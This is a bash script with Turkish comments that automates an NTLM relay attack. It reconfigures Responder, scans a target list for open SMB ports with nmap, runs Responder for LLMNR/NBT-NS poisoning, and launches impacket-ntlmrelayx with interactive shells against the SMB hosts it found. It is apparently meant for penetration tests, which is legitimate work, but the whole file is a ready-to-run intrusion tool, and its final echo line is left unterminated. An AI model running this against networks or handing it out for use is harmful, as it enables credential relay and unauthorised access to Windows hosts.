#!/bin/bash

#XTERM terminali yükleniyor
apt-get install xterm
clear

# Responder'ın HTTP ve SMB özelliklerini kontrol etmek için bir fonksiyon
echo "HTTP ve SMB özellikleri devre dışı bırakılıyor..."
sleep 2
sed -i 's/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /usr/share/responder/Responder.conf
clear

# IP listesinin bulunduğu dizini kullanıcıya sormak için bir mesaj gösterilir
echo -e "\e[1;33m IP Listesinin Bulunduğu dizin (Örneğin: /home/testkapsam/kapsam.txt): \e[0m"
read -p "Dosya Yolu: " iplist
clear

# Tarama başlatılır
echo -e "\e[1;31m Tarama Başlatıldı \e[0m"

# Aktif SMB servisleri tespit edilir
echo -e "\e[1;31m Aktif SMB Servisleri Tespit Ediliyor... \e[0m"
sleep 2
nmap -p445 -T4 --open -iL "$iplist" -oG smbip.txt
clear

# Regex işlemi başlatılır
echo -e "\e[1;33m Regex İşlemi Başlatılıyor... \e[0m"
sleep 1
echo ">"
grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" smbip.txt | sort -u > smbips.txt
rm -f smbip.txt
clear

# Responder'ı xterm ile başlatan fonksiyon
echo -e "\e[1;33m Responder başlatılıyor... \e[0m"
xterm -hold -e "responder -I eth0 -wd" &

# NTLMRelay Interactive Shell başlatılır
echo -e "\e[1;33m NTLMRelay Interactive Shell Başlatılıyor... \e[0m"
xterm -hold -e "impacket-ntlmrelayx -tf smbips.txt -smb2support -i" &

# Kullanıcıya işlemlerin kaç dakika sonra sonlandırılacağını sor
read -p "İşlemler kaç dakika sonra sonlandırılsın? (Varsayılan: 10 dakika): " duration
duration=${duration:-10}
echo "İşlemler $duration dakika sonra sonlandırılacak."
sleep "$duration"m

killall xterm

# Responder'ın HTTP ve SMB özelliklerini kontrol etmek için bir fonksiyon
echo "HTTP ve SMB özellikleri etkinleştiriliyor..."
sleep 2
sed -i 's/HTTP = Off/HTTP = On/g' /usr/share/responder/Responder.conf
sed -i 's/SMB = Off/SMB = On/g' /usr/share/responder/Responder.conf

echo "İşlemler sonlandırıldı.